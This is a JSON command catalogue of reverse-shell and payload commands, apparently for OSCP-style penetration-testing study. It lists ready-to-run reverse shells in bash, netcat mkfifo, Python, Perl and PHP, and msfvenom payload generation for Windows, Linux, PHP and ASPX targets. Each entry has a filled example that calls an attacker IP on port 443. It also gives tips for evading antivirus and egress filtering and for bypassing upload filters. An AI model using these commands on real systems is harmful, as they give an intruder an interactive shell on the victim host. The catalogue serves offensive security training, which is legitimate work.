{
  "category": "exploitation",
  "description": "Shell establishment commands for reverse shells, listeners, payload generation, and TTY upgrades",
  "commands": [
    {
      "id": "nc-listener-setup",
      "name": "Netcat Listener Setup",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "nc -nlvp <LPORT>",
      "description": "Start a netcat listener to catch reverse shells",
      "tags": [
        "ENUMERATION",
        "EXPLOITATION",
        "LISTENER",
        "NETCAT",
        "OSCP:HIGH",
        "QUICK_WIN",
        "SHELL",
        "STARTER"
      ],
      "variables": [
        {
          "name": "<LPORT>",
          "description": "Local port to listen on (commonly 443, 4444, 9001)",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-n": "Do not perform DNS lookups (faster)",
        "-l": "Listen mode for incoming connections",
        "-v": "Verbose output showing connection details",
        "-p": "Specify port to listen on"
      },
      "success_indicators": [
        "Listening on 0.0.0.0 <LPORT>",
        "Connection received from TARGET",
        "Shell prompt appears after connection"
      ],
      "failure_indicators": [
        "Address already in use",
        "Permission denied (ports <1024 require root)",
        "No connection after 5 minutes"
      ],
      "next_steps": [
        "bash-reverse-shell",
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "socat-listener"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "port_in_use": "Use 'lsof -i :<LPORT>' to find process, kill or choose different port",
        "permission_denied": "Use ports >1024 or run with sudo for privileged ports",
        "firewall_blocking": "Check firewall rules: 'sudo iptables -L -n'"
      },
      "notes": "Use port 443 to bypass egress filtering.\n\nAlways start listener BEFORE triggering reverse shell on target.",
      "oscp_relevance": "high",
      "filled_example": "nc -nlvp 443"
    },
    {
      "id": "bash-reverse-shell",
      "name": "Bash Reverse Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
      "description": "Establish reverse shell using bash built-in TCP socket",
      "tags": [
        "EXPLOITATION",
        "NETWORK",
        "OSCP:HIGH",
        "QUICK_WIN",
        "REVERSE_SHELL",
        "SHELL"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-i": "Interactive mode (required for shell)",
        ">&": "Redirect both stdout and stderr",
        "/dev/tcp/": "Bash pseudo-device for TCP connections",
        "0>&1": "Redirect stdin to stdout (bi-directional communication)"
      },
      "success_indicators": [
        "Listener receives connection",
        "Shell prompt appears on listener",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "Connection refused",
        "No such file or directory (/dev/tcp not available)",
        "Command hangs without output"
      ],
      "next_steps": [
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "python-reverse-shell",
        "netcat-reverse-shell-mkfifo"
      ],
      "prerequisites": [
        "nc-listener-setup"
      ],
      "troubleshooting": {
        "no_dev_tcp": "Bash compiled without /dev/tcp support - use netcat or python alternative",
        "connection_refused": "Verify listener is running: 'ss -tlnp | grep <LPORT>'",
        "firewall_blocking": "Test connectivity: 'nc -zv <LHOST> <LPORT>' from target"
      },
      "notes": "Works on most Linux systems.\n\nFirewall-friendly when using port 443/80.\n\nURL-encode for web shells:\nbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27",
      "oscp_relevance": "high",
      "filled_example": "bash -i >& /dev/tcp/192.168.45.200/443 0>&1"
    },
    {
      "id": "python-shell-upgrade",
      "name": "Python PTY Shell Upgrade",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
      "description": "Upgrade dumb shell to interactive PTY shell with tab completion",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOIT",
        "PYTHON",
        "SHELL",
        "UPGRADE"
      ],
      "variables": [],
      "flag_explanations": {
        "-c": "Execute Python command string",
        "import pty": "Import pseudo-terminal module",
        "pty.spawn()": "Spawn new process in pseudo-terminal"
      },
      "success_indicators": [
        "New bash prompt appears",
        "Tab completion works",
        "Arrow keys work for history",
        "CTRL+C doesn't kill shell"
      ],
      "failure_indicators": [
        "python: not found",
        "ImportError: No module named pty",
        "Shell remains dumb (no tab completion)"
      ],
      "next_steps": [
        "stty-shell-stabilization"
      ],
      "alternatives": [],
      "prerequisites": [
        "bash-reverse-shell"
      ],
      "troubleshooting": {
        "no_python3": "Try python2: 'python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "no_python": "Try script: 'script /dev/null -c bash'",
        "still_dumb": "Run stty-shell-stabilization for full interactivity"
      },
      "notes": "First step in shell stabilization.\n\nAlways upgrade shells immediately after catching them.\n\nPython3 preferred but python2 works identically.\n\nAfter upgrade, run:\nexport TERM=xterm",
      "oscp_relevance": "high"
    },
    {
      "id": "stty-shell-stabilization",
      "name": "STTY Shell Stabilization",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg",
      "description": "Fully stabilize reverse shell with proper terminal settings (tab completion, CTRL+C, arrow keys)",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOIT",
        "QUICK_WIN",
        "SHELL",
        "UPGRADE"
      ],
      "variables": [],
      "flag_explanations": {
        "stty raw": "Set terminal to raw mode (passes all input directly)",
        "-echo": "Disable local echo (prevents double typing)",
        "fg": "Bring backgrounded netcat listener back to foreground",
        "export TERM=xterm": "Set terminal type for proper rendering"
      },
      "success_indicators": [
        "Full tab completion works",
        "CTRL+C sends signal to target (doesn't kill shell)",
        "Arrow keys work for history",
        "Clear screen works (CTRL+L)",
        "Terminal output renders properly"
      ],
      "failure_indicators": [
        "CTRL+C kills the shell",
        "Tab completion still broken",
        "Terminal output garbled"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [
        "python-shell-upgrade"
      ],
      "troubleshooting": {
        "shell_killed": "Forgot to background shell with CTRL+Z before running stty command",
        "echo_still_on": "Run 'stty -echo' again in the shell",
        "cant_background": "Some shells don't support backgrounding - use basic python upgrade only"
      },
      "notes": "Full sequence:\n1) python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2) CTRL+Z 3) stty raw -echo; fg 4) export TERM=xterm 5) stty rows 38 cols 116 (match your terminal size with 'stty -a')",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-windows-reverse-tcp",
      "name": "Msfvenom Windows Reverse TCP Payload",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT_FILE>",
      "description": "Generate Windows reverse shell executable payload",
      "tags": [
        "EXPLOITATION",
        "METASPLOIT",
        "MSFVENOM",
        "NETWORK",
        "OSCP:HIGH",
        "PAYLOAD",
        "REMOTE_CODE_EXECUTION",
        "SHELL",
        "WEAPONIZATION",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for payload",
          "example": "shell.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload type (windows/x64/shell_reverse_tcp for 64-bit Windows)",
        "LHOST=": "Set the attacker's listening IP address",
        "LPORT=": "Set the attacker's listening port",
        "-f": "Output format (exe, dll, aspx, etc.)",
        "-o": "Output file name"
      },
      "success_indicators": [
        "Payload size ... bytes",
        "Final size of exe file",
        "No errors during generation",
        "File created successfully"
      ],
      "failure_indicators": [
        "Invalid payload specified",
        "Permission denied writing to output file",
        "Invalid format specified"
      ],
      "next_steps": [
        "nc-listener-setup",
        "python-http-server"
      ],
      "alternatives": [
        "msfvenom-windows-meterpreter"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "av_detection": "Use encoding: add '-e x86/shikata_ga_nai -i 5' (but reduces reliability)",
        "wrong_arch": "Use windows/shell_reverse_tcp for 32-bit targets",
        "execution_failed": "Check architecture matches (x86 vs x64) and AV isn't blocking"
      },
      "notes": "For 32-bit:\nuse 'windows/shell_reverse_tcp'.\n\nFor staged payload:\nuse 'windows/x64/shell/reverse_tcp'.\n\nCommon formats:\nexe, dll, aspx, jsp, war.\n\nAlways test on similar system first.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Execute payload on target"
      },
      "filled_example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f exe -o shell.exe"
    },
    {
      "id": "msfvenom-linux-reverse-tcp",
      "name": "Msfvenom Linux Reverse TCP Payload",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT_FILE>",
      "description": "Generate Linux reverse shell ELF binary",
      "tags": [
        "EXPLOITATION",
        "LINUX",
        "METASPLOIT",
        "MSFVENOM",
        "NETWORK",
        "OSCP:HIGH",
        "PAYLOAD",
        "SHELL",
        "WEAPONIZATION"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for payload",
          "example": "shell.elf",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload type (linux/x64/shell_reverse_tcp for 64-bit Linux)",
        "LHOST=": "Set the attacker's listening IP address",
        "LPORT=": "Set the attacker's listening port",
        "-f": "Output format (elf for Linux executables)",
        "-o": "Output file name"
      },
      "success_indicators": [
        "Payload size ... bytes",
        "Final size of elf file",
        "No errors during generation",
        "File created successfully"
      ],
      "failure_indicators": [
        "Invalid payload specified",
        "Permission denied writing to output file",
        "Invalid format specified"
      ],
      "next_steps": [
        "nc-listener-setup"
      ],
      "alternatives": [
        "bash-reverse-shell",
        "python-reverse-shell"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "wrong_arch": "Use linux/x86/shell_reverse_tcp for 32-bit targets",
        "permission_denied": "chmod +x the payload after transfer",
        "execution_failed": "Check architecture matches and file has execute permissions"
      },
      "notes": "For 32-bit:\nuse 'linux/x86/shell_reverse_tcp'.\n\nAfter transfer:\nchmod +x shell.elf && ./shell.elf.\n\nConsider using bash/python one-liners instead if msfvenom binaries are detected.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "chmod +x <OUTPUT_FILE> Transfer to target and execute"
      },
      "filled_example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f elf -o shell.elf"
    },
    {
      "id": "msfvenom-php-webshell",
      "name": "Msfvenom PHP Web Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o <OUTPUT_FILE>",
      "description": "Generate PHP reverse shell for web application exploitation",
      "tags": [
        "EXPLOITATION",
        "METASPLOIT",
        "MSFVENOM",
        "OSCP:HIGH",
        "PAYLOAD",
        "PHP",
        "SHELL",
        "WEAPONIZATION",
        "WEB"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for payload",
          "example": "shell.php",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload type (php/reverse_php for PHP reverse shell)",
        "LHOST=": "Set the attacker's listening IP address",
        "LPORT=": "Set the attacker's listening port",
        "-f": "Output format (raw for PHP source code)",
        "-o": "Output file name"
      },
      "success_indicators": [
        "Payload size ... bytes",
        "PHP code generated",
        "No errors during generation",
        "File created successfully"
      ],
      "failure_indicators": [
        "Invalid payload specified",
        "Permission denied writing to output file"
      ],
      "next_steps": [
        "nc-listener-setup"
      ],
      "alternatives": [
        "php-reverse-shell"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Try renaming to .jpg.php, .phtml, .php5, or use null byte (.php%00.jpg)",
        "execution_failed": "Verify PHP is enabled and shell functions not disabled",
        "connection_refused": "Check firewall rules allow outbound connections on <LPORT>"
      },
      "notes": "Alternative:\nPentestMonkey PHP reverse shell (more reliable).\n\nCheck disabled_functions in phpinfo() - may need to use alternative payload.\n\nCommon upload bypasses:\n.phtml, .php5, .php3, .inc",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Upload shell.php to target Access via browser: http://target/shell.php"
      },
      "filled_example": "msfvenom -p php/reverse_php LHOST=192.168.45.200 LPORT=443 -f raw -o shell.php"
    },
    {
      "id": "msfvenom-aspx-webshell",
      "name": "Msfvenom ASPX Web Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <OUTPUT_FILE>",
      "description": "Generate ASP.NET reverse shell for IIS web application exploitation",
      "tags": [
        "ASPX",
        "EXPLOITATION",
        "IIS",
        "METASPLOIT",
        "MSFVENOM",
        "OSCP:HIGH",
        "PAYLOAD",
        "SHELL",
        "WEAPONIZATION",
        "WEB",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for payload",
          "example": "shell.aspx",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Payload type (windows/x64/shell_reverse_tcp for Windows target)",
        "LHOST=": "Set the attacker's listening IP address",
        "LPORT=": "Set the attacker's listening port",
        "-f": "Output format (aspx for ASP.NET applications)",
        "-o": "Output file name"
      },
      "success_indicators": [
        "Payload size ... bytes",
        "ASPX code generated",
        "No errors during generation",
        "File created successfully"
      ],
      "failure_indicators": [
        "Invalid payload specified",
        "Permission denied writing to output file"
      ],
      "next_steps": [
        "nc-listener-setup"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Try double extension: .jpg.aspx or content-type spoofing",
        "execution_failed": "Verify ASP.NET is enabled on IIS server",
        "connection_refused": "Check Windows Firewall allows outbound connections"
      },
      "notes": "Works on IIS servers with ASP.NET enabled.\n\nFor ASP classic (older IIS):\nuse '-f asp' instead.\n\nTest upload restrictions first.\n\nConsider using cmd.aspx for simple command execution if reverse shell blocked.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Upload shell.aspx to target Access via browser: http://target/shell.aspx"
      },
      "filled_example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f aspx -o shell.aspx"
    },
    {
      "id": "netcat-reverse-shell-mkfifo",
      "name": "Netcat Reverse Shell (mkfifo)",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
      "description": "Netcat reverse shell without -e flag using named pipes (FIFO)",
      "tags": [
        "EXPLOITATION",
        "NETCAT",
        "OSCP:HIGH",
        "REVERSE_SHELL",
        "SHELL"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "mkfifo": "Create named pipe (FIFO) for bi-directional communication",
        "/bin/sh -i": "Interactive shell",
        "2>&1": "Redirect stderr to stdout",
        ">/tmp/f": "Write output to named pipe"
      },
      "success_indicators": [
        "Listener receives connection",
        "Shell prompt appears on listener",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "Connection refused",
        "mkfifo: command not found",
        "Permission denied"
      ],
      "next_steps": [
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "bash-reverse-shell",
        "python-reverse-shell"
      ],
      "prerequisites": [
        "nc-listener-setup"
      ],
      "troubleshooting": {
        "mkfifo_not_found": "Not available on this system - use bash or python alternative",
        "permission_denied": "Try writing to different directory: /dev/shm/f or /var/tmp/f",
        "connection_refused": "Verify listener is running: 'ss -tlnp | grep <LPORT>'"
      },
      "notes": "Works when netcat compiled without -e flag.\n\nNamed pipe creates bi-directional channel.\n\nAlternative locations for pipe:\n/dev/shm/f (tmpfs, no disk writes), /var/tmp/f (persistent across reboots).",
      "oscp_relevance": "high",
      "filled_example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.200 443 >/tmp/f"
    },
    {
      "id": "python-reverse-shell",
      "name": "Python Reverse Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      "description": "Python-based reverse shell using socket and subprocess modules",
      "tags": [
        "EXPLOITATION",
        "NETWORK",
        "OSCP:HIGH",
        "PYTHON",
        "REVERSE_SHELL",
        "SHELL"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "socket.socket()": "Create TCP socket",
        "s.connect()": "Connect to attacker's listener",
        "os.dup2()": "Duplicate file descriptors (redirect stdin/stdout/stderr to socket)",
        "subprocess.call()": "Execute shell with redirected I/O"
      },
      "success_indicators": [
        "Listener receives connection",
        "Shell prompt appears on listener",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "python: not found",
        "Connection refused",
        "ImportError: No module named socket"
      ],
      "next_steps": [
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "bash-reverse-shell",
        "perl-reverse-shell",
        "netcat-reverse-shell-mkfifo"
      ],
      "prerequisites": [
        "nc-listener-setup"
      ],
      "troubleshooting": {
        "no_python3": "Try python2: replace 'python3' with 'python'",
        "no_python": "Use bash or netcat alternative",
        "connection_refused": "Verify listener is running: 'ss -tlnp | grep <LPORT>'"
      },
      "notes": "Works on most Linux systems.\n\nMore reliable than bash /dev/tcp method.\n\nURL-encode for web shells.\n\nPython2 version identical, just use 'python' instead of 'python3'.\n\nOne-liner format ideal for RCE exploitation.",
      "oscp_relevance": "high",
      "filled_example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.200\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    },
    {
      "id": "perl-reverse-shell",
      "name": "Perl Reverse Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      "description": "Perl-based reverse shell using Socket module",
      "tags": [
        "EXPLOITATION",
        "NETWORK",
        "OSCP:MEDIUM",
        "PERL",
        "REMOTE_CODE_EXECUTION",
        "REVERSE_SHELL",
        "SHELL"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-e": "Execute Perl code",
        "use Socket": "Import socket module",
        "socket()": "Create TCP socket",
        "connect()": "Connect to attacker's listener",
        "open(STDIN,\">&S\")": "Redirect file descriptors to socket"
      },
      "success_indicators": [
        "Listener receives connection",
        "Shell prompt appears on listener",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "perl: not found",
        "Connection refused",
        "Can't locate Socket.pm"
      ],
      "next_steps": [
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "bash-reverse-shell",
        "python-reverse-shell",
        "netcat-reverse-shell-mkfifo"
      ],
      "prerequisites": [
        "nc-listener-setup"
      ],
      "troubleshooting": {
        "no_perl": "Use bash or python alternative",
        "no_socket_module": "Socket module missing - try python alternative",
        "connection_refused": "Verify listener is running: 'ss -tlnp | grep <LPORT>'"
      },
      "notes": "Perl is commonly installed on older Linux/Unix systems.\n\nLess common than bash/python but useful when those aren't available.\n\nOne-liner format ideal for command injection.",
      "oscp_relevance": "medium",
      "filled_example": "perl -e 'use Socket;$i=\"192.168.45.200\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    },
    {
      "id": "php-reverse-shell",
      "name": "PHP Reverse Shell",
      "category": "exploitation",
      "subcategory": "shells",
      "command": "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      "description": "PHP reverse shell one-liner using fsockopen",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "PHP",
        "REMOTE_CODE_EXECUTION",
        "REVERSE_SHELL",
        "SHELL",
        "WEB"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (your Kali machine)",
          "example": "192.168.45.200",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port where listener is running",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-r": "Run PHP code without using PHP tags",
        "fsockopen()": "Open socket connection to attacker",
        "exec()": "Execute shell command",
        "<&3 >&3 2>&3": "Redirect stdin/stdout/stderr to socket (file descriptor 3)"
      },
      "success_indicators": [
        "Listener receives connection",
        "Shell prompt appears on listener",
        "Commands execute on target"
      ],
      "failure_indicators": [
        "php: not found",
        "Connection refused",
        "fsockopen() has been disabled"
      ],
      "next_steps": [
        "python-shell-upgrade",
        "stty-shell-stabilization"
      ],
      "alternatives": [
        "msfvenom-php-webshell",
        "msfvenom-php-reverse",
        "web-shell-php"
      ],
      "prerequisites": [
        "nc-listener-setup"
      ],
      "troubleshooting": {
        "fsockopen_disabled": "Check disabled_functions in phpinfo() - try proc_open or popen alternatives",
        "exec_disabled": "Try system(), passthru(), or shell_exec() instead of exec()",
        "connection_refused": "Verify listener is running and firewall allows outbound connections"
      },
      "notes": "Useful for PHP command injection or when you have PHP RCE.\n\nCheck disabled_functions with:\nphp -r 'print_r(ini_get(\"disable_functions\"));'.\n\nAlternative functions:\nsystem(), passthru(), shell_exec(), popen(), proc_open().",
      "oscp_relevance": "high",
      "filled_example": "php -r '$sock=fsockopen(\"192.168.45.200\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    }
  ]
}